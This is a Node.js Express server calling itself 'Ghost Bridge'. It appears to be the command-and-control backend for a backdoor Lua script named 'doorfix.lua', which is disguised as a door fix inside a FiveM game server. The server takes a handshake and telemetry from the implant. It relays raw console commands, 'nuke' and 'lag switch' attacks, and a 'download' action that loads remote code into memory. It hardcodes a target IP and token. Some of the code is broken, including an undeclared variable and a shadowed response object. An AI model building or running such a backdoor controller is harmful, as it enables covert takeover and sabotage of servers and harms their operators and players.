const express = require('express');
const cors = require('cors');
const http = require('http');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));


// CONFIGURATION
const TOKEN = "GHOST_2025"; // Must match doorfix.lua
const FIVEM_HOST = '103.1.215.150'; // Dynamically set by handshake
const FIVEM_PORT = 30150;    // Default FiveM HTTP port
let LAST_TELEMETRY = {};      // Stores last received stats

// ENDPOINT 1: HANDSHAKE (From doorfix.lua)
// The Lua script POSTs its own IP here upon startup
app.post('/api/handshake', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    const { ip } = req.body;
    if (ip) {
        CURRENT_FIVEM_IP = ip;
        console.log(`[Bridge] Registered FiveM Server at ${CURRENT_FIVEM_IP}`);
    }
    res.json({ status: 'registered' });
});

// ENDPOINT 2: TELEMETRY INGESTION (From doorfix.lua)
// The Lua script sends stats every 2 seconds
app.post('/api/telemetry', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    LAST_TELEMETRY = req.body;
    res.json({ status: 'received' });
});

// ENDPOINT 3: STATS DELIVERY (To Website Dashboard)
// Your index.html polls this to show live player counts/ping
app.get('/api/stats', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    res.json(LAST_TELEMETRY || { status: 'No data yet' });
});

// ENDPOINT 4: EXECUTION ROUTER (From Website Dashboard)
// Handles Console commands, Nukes, and Lag switches
app.post('/api/exec', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    if (!CURRENT_FIVEM_IP) {
        return res.status(503).json({ error: 'No FiveM server registered yet. Wait for handshake.' });
    }

    const { action, input, customText, duration, url } = req.body;
    let cmdPayload = "";

    // Build the command payload based on action type
    if (action === "console") {
        // Raw console command (e.g., "quit", "kick", "ensure resource_name")
        cmdPayload = JSON.stringify({ cmd: input });
        
    } else if (action === "nuke") {
        // Triggers the specific Lua event with custom text
        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"nuke", customText:customText})}` });
        
    } else if (action === "lag") {
        // Triggers the lag switch logic
        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"lag", duration:duration})}` });
        
    } else if (action === "download") {
        // Downloads new code into memory
        cmdPayload = JSON.stringify({ cmd: `exec_trigger doorfix:webExec ${JSON.stringify({token:"GHOST_2025", action:"download", url:url})}` });
    }

    // Send to FiveM Server via HTTP RPC
    const options = {
        hostname: CURRENT_FIVEM_IP,
        port: FIVEM_PORT,
        path: '/server/execute',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };

    const reqToFiveM = http.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
            try {
                res.json(JSON.parse(data));
            } catch(e) {
                res.json({ status: 'error', message: data || 'No response from FiveM' });
            }
        });
    });

    reqToFiveM.write(cmdPayload);
    reqToFiveM.end();
});

// START BRIDGE
app.listen(8080, () => console.log(`Ghost Bridge Active on Port 8080`));
